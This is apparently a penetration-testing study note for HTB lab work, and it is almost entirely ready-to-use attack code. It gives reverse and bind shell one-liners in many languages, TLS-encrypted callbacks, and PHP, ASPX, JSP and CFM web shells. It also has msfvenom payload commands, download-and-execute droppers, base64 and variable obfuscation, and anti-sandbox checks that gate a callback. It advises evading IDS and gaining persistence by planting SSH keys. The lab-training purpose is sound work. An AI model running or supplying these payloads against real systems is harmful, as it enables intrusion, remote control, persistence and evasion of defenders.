# Shells & Payloads

#shells #webshells #msfvenom #payloads #ReverseShell

## What is this?

Generate, deliver, and catch shells for initial access or post-exploitation command execution. Covers reverse/bind/web shells, msfvenom payload generation, listeners (netcat, pwncat-cs, socat), shell stabilization, and web shell deployment. Goal: interactive shell or RCE on the target. Pairs with [[Exploit & File Transfers]], [[Metasploit]], [[Command Injection]].

---

## Tools

| Tool | Purpose |
|---|---|
| [[Tools/Payloads & Shells/msfvenom\|msfvenom]] | Payload generation — executables, DLLs, shellcode, web shells |
| [[Tools/Payloads & Shells/metasploit\|metasploit]] | Framework — stagers, meterpreter listeners, post modules |
| [[Tools/Remote Access/Netcat\|netcat]] / `ncat` | Listener + raw reverse/bind shells |
| [[Tools/Remote Access/pwncat\|pwncat-cs]] | Advanced listener — auto TTY upgrade, file transfer |
| [[Tools/Remote Access/socat\|socat]] | Versatile relay — encrypted shells, port forwarding |
| [[Tools/File Transfer/SMBserver\|impacket-smbserver]] | SMB server for file staging to Windows targets |
| [[Tools/Payloads & Shells/HoaxShell\|HoaxShell]] | Obfuscated PowerShell reverse shell generator |
| `revshells.com` | One-click reverse shell syntax for all languages (website) |

---

## Shell Types

| Type | Direction | Use case |
|------|-----------|----------|
| **Reverse shell** | Victim → Attacker | Attacker listens; victim connects back. Most common — bypasses inbound firewall rules. |
| **Bind shell** | Attacker → Victim | Victim listens; attacker connects. Useful when attacker can't receive connections. |
| **Web shell** | HTTP request → OS | Command execution through web app. Persistent but limited (no interactivity). |
| **Staged** | Two-stage delivery | Small stager downloads full payload. Smaller initial footprint. |
| **Stageless** | Single delivery | Full payload in one file. Works without internet access on target. |

---

## Listeners

### Netcat

```bash
nc -lvnp 9001

# rlwrap for arrow keys / history (Windows shells)
rlwrap nc -lvnp 9001
```

### pwncat-cs (best for Linux — auto upgrades TTY)

```bash
pip install pwncat-cs

# Listen
pwncat-cs -lp 9001

# Connect to bind shell
pwncat-cs <target-ip> 9001
```

### Metasploit multi/handler

```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD linux/x64/shell_reverse_tcp    # match your payload
set LHOST tun0
set LPORT 9001
set ExitOnSession false
run -j    # run as background job, handle multiple sessions
```

---

## Linux Reverse Shells

Use [revshells.com](https://www.revshells.com/) to generate — set IP, port, shell type.

### Bash

```bash
bash -i >& /dev/tcp/10.10.14.x/9001 0>&1

# URL-encoded (for injection contexts)
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.x%2F9001%200%3E%261%22

# From command injection
$(bash -c 'bash -i >& /dev/tcp/10.10.14.x/9002 0>&1')
```

> [!warning] `>& /dev/tcp/...` is **bash-only** — `sh`/dash (and therefore **cron**, whose shell is `/bin/sh`) can't parse it and fails *silently*. Whenever the redirection is read by a non-bash shell (a cron line, a `#!/bin/sh` script, an `at`/scheduler `--command`), wrap it so bash parses its own redirection: `bash -c 'bash -i >& /dev/tcp/host/port 0>&1'`. Full explanation + the `SHELL=/bin/bash` alternative: [[Linux Priv Esc]] → Cron Jobs.

### Python

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.x",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.x",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**PTY variant — fully interactive on connect** (use `pty.spawn` instead of `subprocess.call`, so you land in a real TTY with job control, `sudo`, `su`, tab-completion — no separate [TTY upgrade](#tty-upgrade-linux) step):

```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.x",9001));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
```

> [!tip] Prefer the PTY variant when you can — `pty.spawn` allocates a pseudo-terminal at connect time, so the shell isn't the "dumb" pipe you get from `subprocess.call` (which hangs on `sudo`/`ssh`/`vi` and has no Ctrl-C). Still finish the upgrade with `stty raw -echo; fg` locally for full arrow-key/resize behavior — see [TTY Upgrade](#tty-upgrade-linux). When injecting through a shell that quotes aggressively (e.g. RCE via `subprocess.run(shell=True)`), the `[os.dup2(...) for f in(0,1,2)]` list-comprehension form avoids the semicolons/`for` loop that some quoting mangles.

### Perl

```bash
perl -e 'use Socket;$i="10.10.14.x";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("10.10.14.x",9001).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### PHP (CLI)

```bash
php -r '$sock=fsockopen("10.10.14.x",9001);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Netcat variants

```bash
# Standard (if -e is available)
nc -e /bin/sh 10.10.14.x 9001

# mkfifo (when -e not available)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.x 9001 >/tmp/f
```

### Socat (fully interactive — best option)

```bash
# Attacker listener (fully interactive)
socat file:`tty`,raw,echo=0 tcp-listen:9001

# Victim
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.x:9001
```

### AWK / Find / misc

```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
vim -c ':!/bin/sh'
```

---

## Windows Reverse Shells

### PowerShell (most common)

```powershell
# Basic TCP reverse shell
powershell -NoP -NonI -W Hidden -Exec Bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.x/shell.ps1')"

# One-liner (no download)
powershell -nop -noni -w hidden -ep bypass -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.x',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Base64 encoded (bypass argument restrictions)
$cmd = 'IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.x/shell.ps1")'
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
# Then:
powershell -ep bypass -enc <BASE64>
```

### Nishang (PowerShell reverse shell framework)

```powershell
# On attacker — serve Invoke-PowerShellTcp.ps1
cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .
# Add to end of file:
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.x -Port 9001

# On victim
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.x/Invoke-PowerShellTcp.ps1')
```

### cmd.exe

```cmd
# Using nc.exe (upload first)
nc.exe -e cmd.exe 10.10.14.x 9001

# Using PowerShell to download and execute
cmd /c powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.x/shell.ps1')"
```

### ConPTY Shell (fully interactive Windows)

Use [ConPtyShell](https://github.com/antonioCoco/ConPtyShell) for a fully interactive Windows shell with tab completion, colors, etc.

```powershell
# Attacker
stty raw -echo; (stty size; cat) | nc -lvnp 9001

# Victim
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.x 9001
```

---

## Bind Shells & Encrypted Callbacks

The reverse shells above all assume the target can reach **you** on your chosen port. On a hardened target that assumption is often wrong — egress is firewalled, or a network sensor flags cleartext `sh` on the wire. Test egress *before* you burn the RCE, and switch to a bind shell or an encrypted callback when the plain reverse shell won't land.

### Egress testing — before you spend the RCE

A single-shot RCE is expensive. Confirm which outbound port actually reaches you first, so the shell you fire lands on the first try. From the target's dumb shell:

```bash
# Bash /dev/tcp — probe a port on YOUR box, no tools needed on target.
# Run a listener on the attacker first: nc -lvnp 443
timeout 3 bash -c 'echo > /dev/tcp/10.10.14.x/443' && echo "443 OPEN" || echo "443 blocked"

# Sweep the ports worth trying (443/53/80 usually punch through egress ACLs)
for p in 443 53 80 8443 9001; do
  timeout 2 bash -c "echo > /dev/tcp/10.10.14.x/$p" 2>/dev/null \
    && echo "$p OPEN" || echo "$p blocked"
done
```

> [!note] `/dev/tcp` is a **bash** builtin — it does not exist in `dash`/`sh`/`ash` (`cannot create /dev/tcp/... : Directory nonexistent`). Wrap each probe in `timeout` or a blocked port hangs the loop. If bash isn't present, fall back to `nc -zv 10.10.14.x 443` or a one-off `curl`/`wget` to a listener.

If **no** outbound port reaches you (strict egress, NAT with no inbound, air-gapped segment), stop trying reverse shells — pivot to a **bind shell**: the target listens, you connect *in*.

---

### Bind shells — target listens, you connect in

```bash
# --- Victim listens ---
# netcat with -e (netcat-traditional / nc.exe; OpenBSD nc has NO -e)
nc -lvnp 9001 -e /bin/bash

# mkfifo fallback when -e is unavailable (OpenBSD nc, busybox)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp 9001 > /tmp/f

# socat bind (upgradeable to full PTY — see TTY Upgrade below)
socat TCP-LISTEN:9001,reuseaddr,fork EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane
```

```bash
# --- Attacker connects in ---
nc -v <target-ip> 9001
socat FILE:`tty`,raw,echo=0 TCP:<target-ip>:9001    # interactive against the socat bind
```

For a Windows bind listener without a shell one-liner, generate one with msfvenom (verified payload name — `windows/x64/shell_bind_tcp`, options `LPORT`/optional `RHOST`):

```bash
msfvenom -p windows/x64/shell_bind_tcp LPORT=9001 -f exe -o bind.exe
# run bind.exe on the target, then from the attacker:
nc -v <target-ip> 9001         # or: msfconsole → use exploit/multi/handler
#                                        set payload windows/x64/shell_bind_tcp; set RHOST <target>
```

> [!warning] A bind shell needs the target's **inbound** port open. If a host firewall drops unsolicited inbound (default on modern Windows), the bind port is unreachable from off-host — a bind shell only helps when you've already got a foothold on the same segment, or the listen port rides a rule that's already open. Bind ports are also trivially found by anyone else scanning the box; kill the listener when you're done.

---

### Encrypted callbacks — TLS-wrapped shells

Cleartext `sh` over TCP is what IDS/NSM signatures are tuned for (`id`, `uid=`, `/bin/sh` prompts in the clear). Wrapping the channel in TLS defeats content inspection and looks like ordinary HTTPS on the wire. Two ways, both on default Kali.

**socat + OpenSSL.** Make a throwaway self-signed cert, then listen with `OPENSSL-LISTEN` / connect with `OPENSSL`. `verify=0` is what lets the peer accept the self-signed cert (leaving it out fails the handshake):

```bash
# Attacker: one-time throwaway cert (CN can mimic a benign host to blend in)
openssl req -newkey rsa:2048 -nodes -x509 -days 30 \
  -subj '/CN=cdn.example.com' -keyout shell.key -out shell.crt
cat shell.key shell.crt > shell.pem        # socat wants key+cert in one file

# Attacker listener (TLS server holds the cert)
socat FILE:`tty`,raw,echo=0 OPENSSL-LISTEN:9001,cert=shell.pem,verify=0,fork

# Victim connects back over TLS (fully interactive PTY)
socat OPENSSL:10.10.14.x:9001,verify=0 EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane
```

Or flip it into an **encrypted bind shell** — target is the TLS server, you dial in:

```bash
# Victim listens (needs the cert on the target)
socat OPENSSL-LISTEN:9001,cert=shell.pem,verify=0,fork EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane
# Attacker connects in
socat FILE:`tty`,raw,echo=0 OPENSSL:<target-ip>:9001,verify=0
```

**ncat --ssl** (ships with nmap; simplest option). In listen mode `--ssl` **auto-generates** a temporary 2048-bit cert, so there's nothing to create:

```bash
# Attacker listener — cert generated automatically
ncat --ssl -lvnp 9001

# Victim callback (-e execs the shell over the TLS channel)
ncat --ssl -e /bin/bash 10.10.14.x 9001         # Linux
ncat --ssl -e cmd.exe   10.10.14.x 9001         # Windows (ncat.exe uploaded)
```

If the target has **only stock OpenSSL** (no socat/ncat), you can still bring up a TLS shell against a `socat OPENSSL-LISTEN` / `ncat --ssl` listener with a fifo + `openssl s_client`:

```bash
# Victim — verified working against a socat OPENSSL-LISTEN catcher
rm -f /tmp/s; mkfifo /tmp/s
/bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.14.x:9001 > /tmp/s
```

> [!tip] TLS hides the *content*, not the *connection*. The flow still shows up in NetFlow/Zeek as a session to your IP on an odd port, and a self-signed cert with a random CN is itself an anomaly to a TLS-fingerprinting sensor (JA3/JA3S). Pick a plausible port (443) and CN, and treat encryption as raising the bar, not clearing it — same lesson as [[Techniques/AV & EDR Evasion|AV & EDR Evasion]] for payloads.

---

## TTY Upgrade (Linux)

**When:** Dumb shell (no tab completion, can't use sudo, Ctrl+C kills shell).

### Method 1: Python pty (most common)

```bash
# Step 1: Spawn PTY on victim
python3 -c 'import pty; pty.spawn("/bin/bash")'
# or: python2 
python -c 'import pty;pty.spawn("/bin/bash")'

# Step 2: Background the shell
Ctrl+Z

# Step 3: Fix terminal on attacker
stty raw -echo; fg

# Step 4: After shell resumes, set vars
export TERM=xterm
export SHELL=/bin/bash

# Step 5 (optional): Match terminal size
# On attacker: stty size → note rows/cols
# On victim:
stty rows 50 cols 220
```

### Method 2: No Python? — PTY ladder

No `python`/`python3` is common. The thing that matters: does the tool **allocate a real PTY** (like python's `pty.spawn`, which includes the io-copy loop) or does it just **`exec` a shell** onto the same dumb pipe? Only the former is a real upgrade.

**Clean one-liner that allocates a real PTY — essentially the whole reliable set:**

```bash
script -qc /bin/bash /dev/null                 # util-linux — near-universal on Debian/Ubuntu
#   BSD/macOS arg order:  script -q /dev/null /bin/bash
expect -c 'spawn /bin/bash; interact'          # expect allocates a PTY
ruby -e 'require "pty";PTY.spawn("/bin/bash"){|r,w,p|Thread.new{loop{w.print STDIN.getc}};loop{STDOUT.print r.getc}}'
#   ^ Ruby's stdlib `pty` DOES work, but the one-liner is clunky (you write the copy loop) — prefer script/expect
```

Then finish exactly like Method 1: `Ctrl+Z` → `stty raw -echo; fg` → `export TERM=xterm`.

**No scripted PTY on the box → pull one over the wire, or drop a helper:** `socat` (Method 3) or a `pwncat-cs` listener (auto-upgrades, no victim-side command) both hand you a full PTY. Otherwise upload a prebuilt helper — a **static Go PTY binary** (`creack/pty`) or a static `socat`/`script` — because the "magic" is the copy loop those already contain.

> [!warning] **Bare `exec` is NOT a PTY.** `perl -e 'exec "/bin/bash";'` / `ruby -e 'exec "/bin/bash"'` just swap the process for bash on the *same dumb pipe* — no terminal. **Perl** needs the CPAN `IO::Pty`/`Expect` module for a real PTY (rarely preinstalled); **Go/C/.NET** have no clean one-liner (you'd compile a helper that runs `forkpty` + a select-loop). When you genuinely can't get a PTY, do the **stty-only half** — `Ctrl+Z` → `stty raw -echo; fg` → `export TERM=xterm` — for raw-mode/arrow-keys on the dumb pipe (but `sudo`/`ssh`/`su`/`vi` may still choke). **Windows target?** The PTY story there is [[Class notes/HTB Academy/CPTS v2 (claude)/Shells & Payloads#ConPTY Shell (fully interactive Windows)|ConPtyShell]], not any of these.

### Method 3: socat (fully interactive, no extra steps)

```bash
# Attacker
socat file:`tty`,raw,echo=0 tcp-listen:9001

# Victim
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.x:9001
```

> [!tip] **Even better than a stabilized TTY: drop an SSH key.** A reverse shell — even a fully upgraded one — still dies when the connection drops. If the box runs SSH (22) and you can write a user's home, append your public key to their `~/.ssh/authorized_keys` and log back in over SSH: a stable, fully-interactive session with no password (public-key auth ignores the account password entirely), and free persistence. Do this the moment the shell is stable. Full steps: [[Class notes/HTB Academy/CPTS v2 (claude)/Linux Priv Esc#Stabilize First — Drop an SSH Key (no password needed)|Linux Priv Esc → Drop an SSH Key]].

---

## Web Shells

### PHP

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php echo exec($_REQUEST['cmd']); ?>

# Password protected
<?php if($_GET['p']==='s3cr3t'){system($_GET['cmd']);} ?>

# POST-based (harder to detect in logs)
<?php system($_POST['cmd']); ?>
```

**phpbash** — interactive web shell: [github.com/Arrexel/phpbash](https://github.com/Arrexel/phpbash)

**WhiteWinterWolf PHP webshell** — feature-rich, file manager included.

**Laudanum** — collection of web shells for multiple languages:
```bash
ls /usr/share/laudanum/
cp /usr/share/laudanum/php/php-reverse-shell.php .
# Edit LHOST/LPORT, upload, browse to trigger
```

### ASPX (.NET)

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
    string cmd = Request["cmd"];
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + cmd;
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
%>
```

### JSP (Java/Tomcat)

```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>

<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
java.io.InputStream is = p.getInputStream();
java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
out.println(s.hasNext() ? s.next() : "");
%>
```

### Cold Fusion (CFM)

```cfm
<cfexecute name="cmd.exe" arguments="/c #url.cmd#" timeout="5" variable="output"/>
<cfoutput>#output#</cfoutput>
```

---

## msfvenom

### Staged vs Stageless

```text
linux/x64/shell_reverse_tcp      → stageless (/ not //)
linux/x64/shell/reverse_tcp      → staged (// means staged)
windows/x64/meterpreter_reverse_tcp  → stageless meterpreter
windows/x64/meterpreter/reverse_tcp  → staged meterpreter
```

**When to use which:**

| Situation | Use |
|---|---|
| No outbound internet on target (air-gapped, no DNS) | **Stageless** — full payload delivered in one shot |
| Payload size limit (email attachment, URL length, buffer) | **Staged** — small stager fits where full payload won't |
| Reliability is critical, C2 must work on first hit | **Stageless** — no second-stage download to fail |
| MSF multi/handler is your listener | Either — handler auto-detects |
| AV evasion priority | **Stageless** via a loader (Donut/ScareCrow) — more control over delivery than staged download |

### Anti-Sandbox Checks

Before connecting back, verify the target is a real host rather than an automated sandbox. Sandboxes typically have short execution timeouts, few processes, low RAM, and generic hostnames.

```powershell
# PowerShell — check for sandbox indicators before executing payload
$sandbox = $false

# Generic computer name
if ($env:COMPUTERNAME -match "^(WIN|DESKTOP|SANDBOX|MALTEST|CUCKOO|VIRUS|BOX)\d*$") { $sandbox = $true }

# Very low RAM (sandboxes usually allocate < 2-4 GB)
$ram = (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB
if ($ram -lt 2) { $sandbox = $true }

# Very few running processes (sandboxes often have < 20)
if ((Get-Process).Count -lt 20) { $sandbox = $true }

# No user activity — check last input time via GetLastInputInfo
# (advanced — skip in simple checks)

if (-not $sandbox) {
    # Execute payload
    IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.x/shell.ps1")
}
```

```bash
# Linux — basic sandbox check before callback
sandbox=0

# Fewer than 50 processes = likely sandbox
[ $(ps aux | wc -l) -lt 50 ] && sandbox=1

# Very low uptime = fresh sandbox detonation
[ $(awk '{print int($1)}' /proc/uptime) -lt 300 ] && sandbox=1

[ $sandbox -eq 0 ] && bash -i >& /dev/tcp/10.10.14.x/9001 0>&1
```

> [!note] Anti-sandbox checks matter most when using staged payloads against hardened targets where burning a C2 domain or IP is costly. For HTB labs, skip these — sandboxing isn't a factor.

### Common payloads

```bash
# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.x LPORT=9001 -f elf -o shell.elf

# Windows EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.x LPORT=9001 -f exe -o shell.exe

# Windows Meterpreter EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.x LPORT=9001 -f exe -o meter.exe

# PHP webshell
msfvenom -p php/reverse_php LHOST=10.10.14.x LPORT=9001 -f raw -o shell.php

# ASP
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.x LPORT=9001 -f asp -o shell.asp

# ASPX
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.x LPORT=9001 -f aspx -o shell.aspx

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.x LPORT=9001 -f raw -o shell.jsp

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.x LPORT=9001 -f war -o shell.war

# PowerShell
msfvenom -p cmd/windows/powershell_reverse_tcp LHOST=10.10.14.x LPORT=9001 -f raw -o shell.ps1

# Python
msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.x LPORT=9001 -f raw -o shell.py

# DLL (for DLL hijacking)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.x LPORT=9001 -f dll -o shell.dll

# Shellcode (for injection)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.x LPORT=9001 -f c
```

### Encoding — what it is actually for

```bash
# Single encode
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.x LPORT=9001 -e x64/xor -f exe -o shell.exe

# Iteration
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.x LPORT=9001 -e x64/xor -i 10 -f exe -o shell.exe

# List encoders
msfvenom -l encoders

# Bad-character avoidance — the real modern use case
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.x LPORT=9001 \
  -b '\x00\x0a\x0d' -f c
```

> [!warning] **Encoding is not AV evasion — treat it as bad-character removal.** `x86/shikata_ga_nai` earned its "excellent" rank in an era of pure static signatures; today the **decoder stub itself is signatured**, so an encoded payload is often flagged *because* it is encoded, and `-i 10` just stacks more known stub. Nothing here defeats behavioural detection or an EDR that watches the unpacked shellcode in memory.
>
> Where `-e`/`-b` still genuinely earns its place is **exploit development** — stripping bytes (`\x00`, `\x0a`, `\x0d`) that would terminate a string copy or break the vulnerable parser before your shellcode ever runs. For real evasion see [[Techniques/AV & EDR Evasion|AV & EDR Evasion]].

---

## Payload Delivery (Getting It to the Target)

### HTTP server (attacker serves files)

```bash
python3 -m http.server 80
python3 -m http.server 8001
```

### Linux download methods

```bash
wget http://10.10.14.x/shell.elf -O /tmp/shell.elf
curl http://10.10.14.x/shell.elf -o /tmp/shell.elf
curl http://10.10.14.x/shell.sh | bash    # pipe directly to bash
```

### Windows download methods

```powershell
# PowerShell
(New-Object Net.WebClient).DownloadFile('http://10.10.14.x/shell.exe','C:\Windows\Temp\shell.exe')
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.x/shell.ps1')
Invoke-WebRequest -Uri http://10.10.14.x/shell.exe -OutFile C:\Windows\Temp\shell.exe

# certutil (built-in, LOLBin)
certutil -urlcache -split -f http://10.10.14.x/shell.exe C:\Windows\Temp\shell.exe

# bitsadmin
bitsadmin /transfer job /download /priority high http://10.10.14.x/shell.exe C:\Windows\Temp\shell.exe

# cmd curl (Windows 10+)
curl http://10.10.14.x/shell.exe -o C:\Windows\Temp\shell.exe
```

### SMB delivery (Windows)

```bash
# Attacker — host SMB share
impacket-smbserver share . -smb2support

# Victim — execute directly from UNC
\\10.10.14.x\share\shell.exe

# Or copy
copy \\10.10.14.x\share\shell.exe C:\Windows\Temp\shell.exe
```

---

## Shell Evasion / Obfuscation

### Base64 encode bash payload

```bash
echo 'bash -i >& /dev/tcp/10.10.14.x/9001 0>&1' | base64
# Output: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC54LzQ0NDQgMD4mMQo=

bash -c "{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC54LzQ0NDQgMD4mMQo=}|{base64,-d}|bash"
# Or:
bash -c "$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC54LzQ0NDQgMD4mMQo= | base64 -d)"
```

### PowerShell base64

```powershell
$cmd = 'IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.x/shell.ps1")'
$enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
powershell -ep bypass -enc $enc
```

### IFS bypass (space filter)

`${IFS}` substitutes for spaces in **simple** commands where spaces are filtered — it does NOT
work for reverse shells, because bash parses redirections (`>&`, `0>&1`) before expanding a
variable, so redirection operators inside `$cmd` are treated as literal arguments:

```bash
# Works — space-free file read
cat${IFS}/etc/passwd
X=$'\t';env${X}-i${X}id            # tab as the separator

# For a reverse shell, use base64 or the variable-substitution form below instead —
# NOT an IFS-built command string with redirections.
```

### Variable substitution

```bash
c=bas;h=h;$c$h -i >& /dev/tcp/10.10.14.x/9001 0>&1
```

---

## Quick Reference Checklist

```bash
0. Test egress first (don't waste a one-shot RCE)
   - timeout 3 bash -c 'echo > /dev/tcp/10.10.14.x/443' && echo OPEN
   - no outbound? → bind shell (target listens, you connect in)
   - cleartext flagged? → TLS: socat OPENSSL-LISTEN / ncat --ssl

1. Set up listener
   - Linux target: nc -lvnp 9001
   - Linux target (better): pwncat-cs -lp 9001
   - Windows target: rlwrap nc -lvnp 9001
   - Meterpreter: msf multi/handler

2. Generate/choose shell
   - Linux: bash one-liner, python, socat
   - Windows: PowerShell one-liner, msfvenom EXE
   - Web: PHP system(), ASPX, JSP

3. Deliver payload
   - python3 -m http.server → wget/curl/IWR
   - SMB share for Windows
   - Direct injection if RCE available

4. After catching shell (Linux) — upgrade TTY
   - python3 -c 'import pty; pty.spawn("/bin/bash")'
   - no python? → script -qc /bin/bash /dev/null  (or expect; else stty-only)
   - Ctrl+Z → stty raw -echo; fg
   - export TERM=xterm

5. After catching shell (Windows)
   - rlwrap on listener for arrow keys
   - Migrate to stable process in meterpreter
   - ConPtyShell for fully interactive

6. Verify access
   - id / whoami
   - hostname
   - ip a / ipconfig
   - Check for docker: cat /.dockerenv
```

---

*Created: 2026-02-27*
*Updated: 2026-09-18*
*Model: claude-opus-4-8*
